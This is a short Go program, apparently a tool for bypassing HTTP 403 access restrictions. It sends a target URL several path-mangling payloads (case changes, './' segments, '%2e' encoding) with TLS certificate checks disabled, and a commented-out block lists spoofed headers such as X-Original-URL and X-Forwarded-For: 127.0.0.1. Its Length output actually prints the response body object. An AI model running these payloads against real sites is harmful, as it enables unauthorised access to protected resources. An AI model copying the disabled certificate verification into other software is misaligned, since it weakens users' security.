package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

func req(url string){
	transCfg := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
	}
	client := &http.Client{Transport: transCfg}
	res, err := client.Get(url)

	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("URL: ", url, "| Code: ", res.StatusCode, "| Length:", res.Body)
}


func bypasser(urlArgFunc string, pathArgFunc string) {
	payloads := map[string]string{
		"defaultPayload": "/" + pathArgFunc + "/",
		"upperPayload": "/" + strings.ToUpper(pathArgFunc) + "/",
		"firstUpperPayload": "/" + strings.Title(strings.ToLower(pathArgFunc)) + "/",
		"dotPayload": "/" + pathArgFunc+"/./",
		"dotdotPayload": "/./"+ pathArgFunc + "/./",
		"twoe": "/%2e/" + pathArgFunc + "/",
	}
	/* headers := map[string]string{
		"":"",
		"originalUrl": "X-Original-URL: "+pathArgFunc,
		"customIpAuthorization": "X-Custom-IP-Authorization: 127.0.0.1",
		"forwardedFor": "X-Forwarded-For: 127.0.0.1",
		"rewriteUrl": "X-rewrite-url: "+pathArgFunc,
		"contentLength": "Content-Length: 0",
	} */
	for _,value := range payloads{
		req(urlArgFunc+""+value)
	}
}

func main(){
	urlArg := os.Args[1]
	pathArg := os.Args[2]
	bypasser(urlArg,pathArg)

}
